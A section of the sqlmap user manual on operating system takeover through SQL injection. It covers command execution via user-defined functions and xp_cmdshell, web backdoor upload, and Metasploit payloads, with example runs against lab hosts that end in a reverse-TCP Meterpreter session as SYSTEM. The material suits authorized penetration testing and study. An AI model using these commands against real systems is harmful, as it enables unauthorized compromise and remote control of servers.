## Operating system takeover

### Run arbitrary operating system command

Option and switch: `--os-cmd` and `--os-shell`

It is possible to **run arbitrary commands on the database server's underlying operating system** when the back-end database management system is either MySQL, PostgreSQL or Microsoft SQL Server, and the session user has the needed privileges to abuse database specific functionalities and architectural weaknesses.

On MySQL and PostgreSQL, sqlmap uploads (via the file upload functionality explained above) a shared library (binary file) containing two user-defined functions, `sys_exec()` and `sys_eval()`, then it creates these two functions on the database and calls one of them to execute the specified command, depending on user's choice to display the standard output or not. On Microsoft SQL Server, sqlmap abuses the `xp_cmdshell` stored procedure: if it is disabled (by default on Microsoft SQL Server >= 2005), sqlmap re-enables it; if it does not exist, sqlmap creates it from scratch.

When the user requests the standard output, sqlmap uses one of the enumeration SQL injection techniques (blind, inband or error-based) to retrieve it. Vice versa, if the standard output is not required, stacked query SQL injection technique is used to execute the command.

These techniques are detailed in the white paper [Advanced SQL injection to operating system full control](http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system-full-control-whitepaper-4633857).

Example against a PostgreSQL target:

```
$ python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" --\
os-cmd id -v 1

[...]
web application technology: PHP 5.2.6, Apache 2.2.9
back-end DBMS: PostgreSQL
[hh:mm:12] [INFO] fingerprinting the back-end DBMS operating system
[hh:mm:12] [INFO] the back-end DBMS operating system is Linux
[hh:mm:12] [INFO] testing if current user is DBA
[hh:mm:12] [INFO] detecting back-end DBMS version from its banner
[hh:mm:12] [INFO] checking if UDF 'sys_eval' already exist
[hh:mm:12] [INFO] checking if UDF 'sys_exec' already exist
[hh:mm:12] [INFO] creating UDF 'sys_eval' from the binary UDF file
[hh:mm:12] [INFO] creating UDF 'sys_exec' from the binary UDF file
do you want to retrieve the command standard output? [Y/n/a] y
command standard output:    'uid=104(postgres) gid=106(postgres) groups=106(post
gres)'

[hh:mm:19] [INFO] cleaning up the database management system
do you want to remove UDF 'sys_eval'? [Y/n] y
do you want to remove UDF 'sys_exec'? [Y/n] y
[hh:mm:23] [INFO] database management system cleanup finished
[hh:mm:23] [WARNING] remember that UDF shared object files saved on the file sys
tem can only be deleted manually
```

It is also possible to simulate a real shell where you can type as many arbitrary commands as you wish. The option is `--os-shell` and has the same TAB completion and history functionalities that `--sql-shell` has. 

Where stacked queries has not been identified on the web application (e.g. PHP or ASP with back-end database management system being MySQL) and the DBMS is MySQL, it is still possible to abuse the `SELECT` clause's `INTO OUTFILE` to create a web backdoor in a writable folder within the web server document root and still get command execution assuming the back-end DBMS and the web server are hosted on the same server. sqlmap supports this technique and allows the user to provide a comma-separated list of possible document root sub-folders where try to upload the web file stager and the subsequent web backdoor. Also, sqlmap has its own tested web file stagers and backdoors for the following languages: 

* ASP
* ASP.NET
* JSP
* PHP

### Out-of-band stateful connection: Meterpreter & friends

Switches and options: `--os-pwn`, `--os-smbrelay`, `--os-bof`, `--priv-esc`, `--msf-path` and `--tmp-path`

It is possible to establish an **out-of-band stateful TCP connection between the attacker machine and the database server** underlying operating system when the back-end database management system is either MySQL, PostgreSQL or Microsoft SQL Server, and the session user has the needed privileges to abuse database specific functionalities and architectural weaknesses. This channel can be an interactive command prompt, a Meterpreter session or a graphical user interface (VNC) session as per user's choice. 

sqlmap relies on Metasploit to create the shellcode and implements four different techniques to execute it on the database server. These techniques are:

* Database **in-memory execution of the Metasploit's shellcode** via sqlmap own user-defined function `sys_bineval()`. Supported on MySQL and PostgreSQL - switch `--os-pwn`.
* Upload and execution of a Metasploit's **stand-alone payload stager** via sqlmap own user-defined function `sys_exec()` on MySQL and PostgreSQL or via `xp_cmdshell()` on Microsoft SQL Server - switch `--os-pwn`.
* Execution of Metasploit's shellcode by performing a **SMB reflection attack** ([MS08-068](http://www.microsoft.com/technet/security/Bulletin/MS08-068.mspx)) with a UNC path request from the database server to
the attacker's machine where the Metasploit `smb_relay` server exploit listens. Supported when running sqlmap with high privileges (`uid=0`) on Linux/Unix and the target DBMS runs as Administrator on Windows - switch `--os-smbrelay`.
* Database in-memory execution of the Metasploit's shellcode by exploiting **Microsoft SQL Server 2000 and 2005
`sp_replwritetovarbin` stored procedure heap-based buffer overflow** ([MS09-004](http://www.microsoft.com/technet/security/bulletin/ms09-004.mspx)). sqlmap has its own exploit to trigger the
vulnerability with automatic DEP memory protection bypass, but it relies on Metasploit to generate the shellcode to get executed upon successful exploitation - switch `--os-bof`.

These techniques are detailed in the white paper [Advanced SQL injection to operating system full control](http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system-full-control-whitepaper-4633857) and in the
slide deck [Expanding the control over the operating system from the database](http://www.slideshare.net/inquis/expanding-the-control-over-the-operating-system-from-the-database).

Example against a MySQL target:

```
$ python sqlmap.py -u "http://192.168.136.129/sqlmap/mysql/iis/get_int_55.aspx?\
id=1" --os-pwn --msf-path /software/metasploit

[...]
[hh:mm:31] [INFO] the back-end DBMS is MySQL
web server operating system: Windows 2003
web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0
back-end DBMS: MySQL 5.0
[hh:mm:31] [INFO] fingerprinting the back-end DBMS operating system
[hh:mm:31] [INFO] the back-end DBMS operating system is Windows
how do you want to establish the tunnel?
[1] TCP: Metasploit Framework (default)
[2] ICMP: icmpsh - ICMP tunneling
> 
[hh:mm:32] [INFO] testing if current user is DBA
[hh:mm:32] [INFO] fetching current user
what is the back-end database management system architecture?
[1] 32-bit (default)
[2] 64-bit
> 
[hh:mm:33] [INFO] checking if UDF 'sys_bineval' already exist
[hh:mm:33] [INFO] checking if UDF 'sys_exec' already exist
[hh:mm:33] [INFO] detecting back-end DBMS version from its banner
[hh:mm:33] [INFO] retrieving MySQL base directory absolute path
[hh:mm:34] [INFO] creating UDF 'sys_bineval' from the binary UDF file
[hh:mm:34] [INFO] creating UDF 'sys_exec' from the binary UDF file
how do you want to execute the Metasploit shellcode on the back-end database und
erlying operating system?
[1] Via UDF 'sys_bineval' (in-memory way, anti-forensics, default)
[2] Stand-alone payload stager (file system way)
> 
[hh:mm:35] [INFO] creating Metasploit Framework multi-stage shellcode 
which connection type do you want to use?
[1] Reverse TCP: Connect back from the database host to this machine (default)
[2] Reverse TCP: Try to connect back from the database host to this machine, on 
all ports 
between the specified and 65535
[3] Bind TCP: Listen on the database host for a connection
> 
which is the local address? [192.168.136.1] 
which local port number do you want to use? [60641] 
which payload do you want to use?
[1] Meterpreter (default)
[2] Shell
[3] VNC
> 
[hh:mm:40] [INFO] creation in progress ... done
[hh:mm:43] [INFO] running Metasploit Framework command line interface locally, p
lease wait..

                                _
                                | |      o
_  _  _    _ _|_  __,   ,    _  | |  __    _|_
/ |/ |/ |  |/  |  /  |  / \_|/ \_|/  /  \_|  |
|  |  |_/|__/|_/\_/|_/ \/ |__/ |__/\__/ |_/|_/
                        /|
                        \|


    =[ metasploit v3.7.0-dev [core:3.7 api:1.0]
+ -- --=[ 674 exploits - 351 auxiliary
+ -- --=[ 217 payloads - 27 encoders - 8 nops
    =[ svn r12272 updated 4 days ago (2011.04.07)

PAYLOAD => windows/meterpreter/reverse_tcp
EXITFUNC => thread
LPORT => 60641
LHOST => 192.168.136.1
[*] Started reverse handler on 192.168.136.1:60641 
[*] Starting the payload handler...
[hh:mm:48] [INFO] running Metasploit Framework shellcode remotely via UDF 'sys_b
ineval', please wait..
[*] Sending stage (749056 bytes) to 192.168.136.129
[*] Meterpreter session 1 opened (192.168.136.1:60641 -> 192.168.136.129:1689) a
t Mon Apr 11 hh:mm:52 +0100 2011

meterpreter > Loading extension espia...success.
meterpreter > Loading extension incognito...success.
meterpreter > [-] The 'priv' extension has already been loaded.
meterpreter > Loading extension sniffer...success.
meterpreter > System Language : en_US
OS              : Windows .NET Server (Build 3790, Service Pack 2).
Computer        : W2K3R2
Architecture    : x86
Meterpreter     : x86/win32
meterpreter > Server username: NT AUTHORITY\SYSTEM
meterpreter > ipconfig

MS TCP Loopback interface
Hardware MAC: 00:00:00:00:00:00
IP Address  : 127.0.0.1
Netmask     : 255.0.0.0



Intel(R) PRO/1000 MT Network Connection
Hardware MAC: 00:0c:29:fc:79:39
IP Address  : 192.168.136.129
Netmask     : 255.255.255.0


meterpreter > exit

[*] Meterpreter session 1 closed.  Reason: User exit
```

By default MySQL on Windows runs as `SYSTEM`, however PostgreSQL runs as a low-privileged user `postgres` on both Windows and Linux. Microsoft SQL Server 2000 by default runs as `SYSTEM`, whereas Microsoft SQL Server 2005 and 2008 run most of the times as `NETWORK SERVICE` and sometimes as `LOCAL SERVICE`. 

It is possible to provide sqlmap with switch `--priv-esc` to perform a **database process' user privilege escalation** via Metasploit's `getsystem` command which include, among others, the [kitrap0d](http://archives.neohapsis.com/archives/fulldisclosure/2010-01/0346.html) technique ([MS10-015](http://www.microsoft.com/technet/security/bulletin/ms10-015.mspx)).